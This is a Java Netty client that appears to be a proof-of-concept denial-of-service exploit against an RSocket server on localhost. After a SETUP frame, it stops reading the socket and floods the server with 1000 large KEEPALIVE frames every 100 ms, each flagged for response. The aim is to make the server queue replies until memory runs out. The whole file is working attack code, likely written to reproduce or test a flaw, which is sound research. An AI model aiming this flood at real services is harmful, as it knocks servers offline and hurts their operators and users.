package example.client;

import io.netty.bootstrap.Bootstrap;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufAllocator;
import io.netty.buffer.Unpooled;
import io.netty.channel.ChannelDuplexHandler;
import io.netty.channel.ChannelFuture;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInitializer;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.TimeUnit;

public class Main {
    private static final Logger logger = LoggerFactory.getLogger(Main.class);

    public static void main(String[] args) {
        InetSocketAddress address = new InetSocketAddress("localhost", 7000);
        Bootstrap bootstrap = new Bootstrap()
                .group(new NioEventLoopGroup())
                .channel(NioSocketChannel.class)
                .handler(
                        new ChannelInitializer<SocketChannel>() {
                            @Override
                            protected void initChannel(SocketChannel ch) {
                                ch.pipeline().addLast(new RSocketStreamOverflowHandler());
                            }
                        });

        ChannelFuture connect = bootstrap.connect(address);
        connect.awaitUninterruptibly();
        logger.info("connected to {}", address);
        connect.channel().closeFuture().awaitUninterruptibly();
    }

    private static final class RSocketStreamOverflowHandler extends ChannelDuplexHandler {
        private static final byte[] METADATA_TYPE = "message/x.rsocket.composite-metadata.v0".getBytes(StandardCharsets.UTF_8);
        private static final byte[] DATA_TYPE = "application/cbor".getBytes(StandardCharsets.UTF_8);

        @Override
        public void channelActive(ChannelHandlerContext ctx) throws Exception {
            super.channelActive(ctx);

            /*stop reading socket*/
            ctx.channel().config().setAutoRead(false);

            ByteBufAllocator allocator = ctx.alloc();

            /*setup frame*/

            ByteBuf setupFrame = allocator.buffer();
            int keepAliveInterval = 100_000;
            setupFrame/*streamId*/
                    .writeInt(0)
                    /*flags*/
                    .writeShort(/*FrameType.SETUP*/0x01 << 10)
                    /*version*/
                    .writeInt(1 << 16)
                    /*keep-alive interval: 100 sec*/
                    .writeInt(keepAliveInterval)
                    /*keep-alive timeout: 1000 sec*/
                    .writeInt(1_000_000)
                    /*metadata type*/
                    .writeByte(METADATA_TYPE.length).writeBytes(METADATA_TYPE)
                    /*data type*/
                    .writeByte(DATA_TYPE.length).writeBytes(DATA_TYPE);

            ByteBuf setupLengthPrefix = encodeLength(allocator, setupFrame.readableBytes());

            ctx.write(setupLengthPrefix);
            ctx.writeAndFlush(setupFrame);
            logger.info("==> write SETUP frame with keep-alive interval {} millis", keepAliveInterval);

                    /*keep-alive data*/
            StringBuilder content = new StringBuilder();
            for (int i = 0; i < 500; i++) {
                content.append("keepalive-overflow");
            }
            byte[] contentBytes = content.toString().getBytes(StandardCharsets.UTF_8);
            int batchSize = 1000;
            int batchInterval = 100;
            logger.info("==> stop reads, write KEEP-ALIVE frame batches of size {} every {} millis, payload size: {}",
                    batchSize, batchInterval, contentBytes.length);
            /*send keep-alive frames periodically: 1000 frames every 100 millis*/
            ctx.channel().eventLoop().scheduleAtFixedRate(() -> {
                for (int i = 0; i < batchSize; i++) {
                    /*keepalive frame*/
                    ByteBuf keepAliveFrame = allocator.buffer();
                    keepAliveFrame/*streamId*/
                            .writeInt(0)
                            /*flags*/
                            .writeShort(/*FrameType.KEEPALIVE*/0x03 << 10 | /*respond flag*/1 << 7)
                            /*lastReceivedPos*/
                            .writeLong(0);

                    ByteBuf keepAliveData = Unpooled.wrappedBuffer(contentBytes);

                    ByteBuf keepAliveLengthPrefix = encodeLength(allocator,
                            keepAliveFrame.readableBytes() + keepAliveData.readableBytes());

                    ctx.write(keepAliveLengthPrefix);
                    ctx.write(keepAliveFrame);
                    ctx.writeAndFlush(keepAliveData);
                    if (!ctx.channel().isWritable()) {
                        ctx.flush();
                    }
                }

            }, 0, batchInterval, TimeUnit.MILLISECONDS);
        }

        private ByteBuf encodeLength(ByteBufAllocator allocator, int length) {
            ByteBuf lengthPrefix = allocator.buffer(3);
            lengthPrefix.writeByte(length >> 16);
            lengthPrefix.writeByte(length >> 8);
            lengthPrefix.writeByte(length);
            return lengthPrefix;
        }
    }
}
